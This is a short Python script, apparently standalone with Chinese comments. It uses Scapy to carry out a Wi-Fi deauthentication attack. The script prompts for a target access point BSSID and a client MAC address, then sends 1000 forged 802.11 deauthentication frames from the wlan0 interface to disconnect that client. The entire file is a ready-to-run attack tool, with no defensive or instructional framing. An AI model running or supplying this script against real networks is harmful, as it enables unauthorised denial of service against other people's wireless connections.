from scapy.all import *
import sys

# 确认scapy是否安装
try:
    from scapy.all import *
except ImportError:
    print("Scapy模块未安装。请运行 'pip install scapy' 安装。")
    sys.exit()

# 指定网络接口
iface = "wlan0"

# 用户输入目标BSSID和客户端MAC地址
bssid = input("输入目标BSSID: ")
client_mac = input("输入客户端MAC地址: ")

# 创建Deauthentication帧
dot11 = Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
frame = RadioTap()/dot11/Dot11Deauth(reason=7)

# 发送帧
sendp(frame, iface=iface, count=1000, inter=0.1)

print("Deauthentication包已发送。")